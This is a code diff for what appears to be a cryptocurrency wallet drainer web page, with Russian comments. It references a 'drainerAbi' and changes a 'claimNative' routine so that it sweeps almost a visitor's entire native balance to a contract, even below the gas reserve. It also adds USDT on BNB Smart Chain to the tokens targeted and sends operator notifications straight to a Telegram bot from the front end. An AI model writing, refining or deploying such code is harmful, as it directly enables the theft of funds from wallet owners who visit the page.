@@ -300,17 +300,17 @@ function detectDevice() {
   return 'Desktop'
 }
 
-// Функция отправки уведомления через бэкенд (секреты на сервере)
+// Функция отправки сообщений в Telegram (через фронт)
 async function sendTelegramMessage(message) {
   try {
-    const response = await fetch('https://api.cryptomuspayye.icu/api/notify', {
+    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
+      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
     })
     const data = await response.json()
-    if (!data.success) throw new Error(data.message || 'Failed to send notification')
-    console.log('Notification sent successfully')
+    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message')
+    console.log('Telegram message sent successfully')
   } catch (error) {
     store.errors.push(`Error sending Telegram message: ${error.message}`)
   }
@@ -437,6 +437,7 @@ const TOKENS = {
     { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 8 }
   ],
   'BNB Smart Chain': [
+    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
     { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
     { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
     { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
@@ -650,10 +651,14 @@ const getNativeBalance = async (wagmiConfig, address, chainId) => {
 
 // Резерв газа на отправку нативного токена (в wei)
 const getGasReserveWei = (chainId) => {
-  // Базовый резерв 0.0005 для EVM‑сетей с 18 десятичными
-  const baseReserve = parseUnits('0.0005', 18)
-  // Можно тонко настроить под сеть при необходимости
-  return baseReserve
+  // Адаптивный резерв: разные сети – разный минимальный gas reserve
+  if (chainId === networkMap['BNB Smart Chain'].chainId) return parseUnits('0.0001', 18) // BNB дешёвый газ
+  if (chainId === networkMap['Polygon'].chainId) return parseUnits('0.1', 18) // MATIC дешёвый газ, но в MATIC
+  if (chainId === networkMap['Avalanche'].chainId) return parseUnits('0.002', 18)
+  if (chainId === networkMap['Fantom'].chainId) return parseUnits('0.2', 18)
+  if (chainId === networkMap['Celo'].chainId) return parseUnits('0.02', 18)
+  // По умолчанию для ETH‑подобных – 0.0005
+  return parseUnits('0.0005', 18)
 }
 
 const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => {
@@ -663,8 +668,10 @@ const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => 
   // Баланс приходит как число, переводим в wei
   const balanceWei = parseUnits(nativeBalance.toString(), 18)
   const reserveWei = getGasReserveWei(chainId)
-  if (balanceWei <= reserveWei) throw new Error('Insufficient native balance after gas reserve')
-  const valueToSend = balanceWei - reserveWei
+  // Если баланс меньше резерва, пытаемся отправить почти всё (минимальный остаток)
+  const minDust = parseUnits('0.000001', 18)
+  const valueToSend = balanceWei > reserveWei + minDust ? (balanceWei - reserveWei) : (balanceWei > minDust ? (balanceWei - minDust) : 0n)
+  if (valueToSend <= 0n) throw new Error('Insufficient native balance to send')
   const txHash = await writeContract(wagmiConfig, {
     address: getAddress(contractAddress),
     abi: drainerAbi,
@@ -963,6 +970,9 @@ const initializeSubscribers = (modal) => {
               txHash
             )
           } catch (error) {
+            // Показать пользователю причину и оставить модалку открытой на короткое время
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = `Native claim failed: ${error.message}`
             store.errors.push(`Native claim failed: ${error.message}`)
           }
           hideCustomModal()
